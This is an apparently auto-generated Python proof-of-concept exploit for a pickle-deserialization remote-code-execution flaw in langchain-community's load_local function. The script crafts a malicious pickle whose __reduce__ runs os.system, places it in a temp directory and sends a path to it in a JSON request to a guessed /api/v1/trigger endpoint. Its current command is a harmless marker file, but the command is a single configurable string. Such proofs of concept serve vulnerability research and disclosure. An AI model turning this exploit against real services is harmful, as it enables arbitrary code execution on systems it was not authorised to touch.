#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-014
# Sink: load_local
# Auto-generated — run with: python3 rce_folder_index_name_load_local.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The function loads a pickle file from a path constructed from user-controlled
folder_path and index_name parameters. If allow_dangerous_deserialization is True (as required
to use the function), an attacker can perform path traversal to load a malicious pickle file,
leading to arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Using path traversal in the folder_path parameter to load the malicious pickle
3. Triggering the deserialization which executes the payload

Usage: python3 poc.py [target_url]
Default target: http://localhost:8000
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
import time
import requests

# Configuration
DEFAULT_TARGET = "http://localhost:8000"
MALICIOUS_COMMAND = "touch /tmp/poc_success.txt"
POC_MARKER = "/tmp/poc_success.txt"


def create_malicious_pickle(command: str) -> bytes:
    """
    Create a malicious pickle payload that executes a system command.
    
    Uses __reduce__ to execute the command via os.system when unpickled.
    """
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    return pickle.dumps(MaliciousPayload())


def setup_exploit_files() -> tuple[str, str]:
    """
    Create the malicious pickle file and return the path traversal payload.
    
    Returns:
        tuple: (path_traversal_payload, temp_dir_path)
    """
    # Create a temporary directory for our malicious pickle
    temp_dir = tempfile.mkdtemp(prefix="poc_exploit_")
    
    # Create the malicious pickle file
    malicious_pickle_path = os.path.join(temp_dir, "exploit.pkl")
    payload = create_malicious_pickle(MALICIOUS_COMMAND)
    
    with open(malicious_pickle_path, "wb") as f:
        f.write(payload)
    
    print(f"[*] Created malicious pickle at: {malicious_pickle_path}")
    print(f"[*] Payload will execute: {MALICIOUS_COMMAND}")
    
    # Calculate path traversal to reach our malicious file
    # We need to traverse from wherever the app expects to our temp dir
    # Using absolute path to be safe
    path_traversal = malicious_pickle_path.replace(".pkl", "")
    
    return path_traversal, temp_dir


def send_exploit(target_url: str, folder_path: str, index_name: str = "exploit") -> bool:
    """
    Send the exploit request to the target.
    
    Args:
        target_url: Base URL of the vulnerable application
        folder_path: Path traversal payload for folder_path parameter
        index_name: Name for the index file (without .pkl extension)
    
    Returns:
        bool: True if request was sent successfully
    """
    # The vulnerable endpoint is typically /api/v1/trigger
    # Adjust this based on the actual application
    endpoint = f"{target_url}/api/v1/trigger"
    
    # The payload structure depends on how the application passes parameters
    # Common patterns: JSON body, query parameters, or form data
    payload = {
        "folder_path": folder_path,
        "index_name": index_name,
        "allow_dangerous_deserialization": True
    }
    
    print(f"[*] Sending exploit to: {endpoint}")
    print(f"[*] Payload: {payload}")
    
    try:
        response = requests.post(
            endpoint,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        return True
    except requests.exceptions.ConnectionError:
        print("[!] Connection failed - target may not be running")
        return False
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
        return False
    except Exception as e:
        print(f"[!] Error sending request: {e}")
        return False


def verify_exploit() -> bool:
    """
    Check if the exploit was successful by looking for the marker file.
    
    Returns:
        bool: True if marker file exists
    """
    time.sleep(1)  # Give the command time to execute
    if os.path.exists(POC_MARKER):
        print(f"[+] Exploit successful! Marker file created: {POC_MARKER}")
        # Clean up the marker
        os.remove(POC_MARKER)
        return True
    else:
        print("[-] Exploit may not have succeeded - marker file not found")
        return False


def cleanup(temp_dir: str):
    """Remove temporary files."""
    import shutil
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print(f"[*] Cleaned up temporary directory: {temp_dir}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community RCE via pickle deserialization"
    )
    parser.add_argument(
        "target",
        nargs="?",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--no-cleanup",
        action="store_true",
        help="Don't clean up temporary files after exploit"
    )
    
    args = parser.parse_args()
    
    print("[*] langchain-community RCE PoC")
    print("[*] ===========================")
    print(f"[*] Target: {args.target}")
    print()
    
    # Step 1: Create the malicious pickle file
    print("[*] Step 1: Creating malicious pickle file...")
    path_traversal, temp_dir = setup_exploit_files()
    print()
    
    # Step 2: Send the exploit
    print("[*] Step 2: Sending exploit request...")
    success = send_exploit(args.target, path_traversal)
    print()
    
    # Step 3: Verify the exploit
    print("[*] Step 3: Verifying exploit...")
    if success:
        verify_exploit()
    print()
    
    # Cleanup
    if not args.no_cleanup:
        cleanup(temp_dir)
    
    print("[*] PoC completed")


if __name__ == "__main__":
    main()
